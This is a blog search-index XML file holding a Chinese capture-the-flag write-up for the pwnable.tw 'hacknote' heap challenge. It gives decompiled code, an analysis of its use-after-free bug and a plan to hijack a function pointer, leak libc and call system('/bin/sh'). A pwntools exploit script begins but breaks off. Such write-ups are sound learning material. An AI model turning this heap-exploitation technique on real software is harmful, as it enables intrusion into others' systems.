<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XCTF-CHALLENGE-notehack</title>
      <link href="/2020/09/13/xctf-challenge-notehack/"/>
      <url>/2020/09/13/xctf-challenge-notehack/</url>
      
        <content type="html"><![CDATA[<h2 id="别的不说，看我一手E技能点Q点点，破败接点点，芜湖-起飞-。"><a href="#别的不说，看我一手E技能点Q点点，破败接点点，芜湖-起飞-。" class="headerlink" title="别的不说，看我一手E技能点Q点点，破败接点点，芜湖 起飞~~。"></a>别的不说，看我一手E技能点Q点点，破败接点点，芜湖 起飞~~。</h2><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>pwnable<span class="token punctuation">.</span>tw hacknote$ checksec hacknote<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/how2heap/my_heap/pwnable.tw hacknote/hacknote'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>只要没开启PIE就好说<span class="token operator">~</span>hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>pwnable<span class="token punctuation">.</span>tw hacknote$ <span class="token punctuation">.</span>/hacknote <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>       HackNote       <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token number">1</span><span class="token punctuation">.</span> Add note           <span class="token number">2</span><span class="token punctuation">.</span> Delete note        <span class="token number">3</span><span class="token punctuation">.</span> Print note         <span class="token number">4</span><span class="token punctuation">.</span> Exit              <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Your choice <span class="token operator">:</span></code></pre><p>经典堆题</p><h2 id="IDA–关键函数"><a href="#IDA–关键函数" class="headerlink" title="IDA–关键函数"></a>IDA–关键函数</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>chunk_current<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_cont <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self_puts<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        chunk_current <span class="token operator">=</span> note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        chunk_current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>note_cont<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h3><p>个人觉得经典堆题最重要的是要分析清楚其信息存放的数据结构，也就是着重分析add函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>chunk_current<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_cont <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//note_cont全局变量，note的个数最多为5</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//note_ptr是全局指针数组，存放chunk的指针</span>      <span class="token punctuation">{</span>        note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//8个字节是32位下最小的chunk</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//其实只要我们不会用到这些报错函数，完全可忽略</span>        <span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self_puts<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解引用 指向chunk的指针，并放入信息</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        chunk_current <span class="token operator">=</span> note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk_current 存放当前操作的chunk的地址 即chunk_user_data_addr</span>        chunk_current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk_current[1]即chunk_user_data第二个字长 。</span>                                        <span class="token comment" spellcheck="true">//再次malloc size的空间其chunk_user_data_addr放入chunk_current[1]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>                                     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//====>read(0, *((void **)note_ptr[i] + 1), size); 这里用ida简化了</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//将chunk地址转化为void**(二级指针) 类型指针 然后+1 再整体解引用 也就是获取了chunk_user_data第二个字长里面的信息</span>        <span class="token operator">++</span>note_cont<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">//即malloc(size)的地址</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最好还是画出数据结构图：<br><img src="https://s1.ax1x.com/2020/09/13/w0Ck28.png" alt=""><br>再看看add的好兄弟，del函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//删除的目标是否空闲</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//free掉content_chunk</span>    <span class="token function">free</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//free掉第信息 chunk</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将add函数中申请的两个chunk都释放，但是没有将指针置零，即指针还在指针数组note_ptr[i]中，这就出现了UFA漏洞。</p><p>纵身一跃来到show函数和他的好基友self_puts函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//在add函数中第一个chunk的第一个字段就存放了self_puts函数的地址，</span>                                    <span class="token comment" spellcheck="true">//结合self_puts函数分析可知这里是利用函数指针进行函数调用</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//注意这个+4之后再整体解引用</span><span class="token punctuation">}</span></code></pre><p>如果正常执行这里将会输出第一个chunk的第二字段所指向的conten_chunk.</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li><p>存在USF漏洞</p></li><li><p>刚好在show函数会将第一个chunk里的第一字段视为函数指针进行解引用（高权限指针）</p></li><li><p>先进行两次add 得到两个note 每一个note里面包含两个chunk第一个chunk大小为0x10 ，第二个chunk大小为0x18</p></li><li><p>del前两个note，再add一个note其chunk_1 大小为0x10，chunk_2大小为0x10，这样低权限指针就会和高权限指针指向同一个chunk<br><img src="https://s1.ax1x.com/2020/09/13/w0CAxS.png" alt=""></p></li><li><p>没有system bin/sh 后门 所以要泄露地址===&gt;利用note3往其第二个chunk中写入p32（self_puts）和p32（@got）然后执行show（0）即可泄露got表里面的内容</p></li><li><p>得到libc版本，和libc地址后获取system  bin/sh地址</p></li><li><p>del（2）再次add（3）这次将p32（system）和p32(/bin/sh)填入，再show（0）</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token 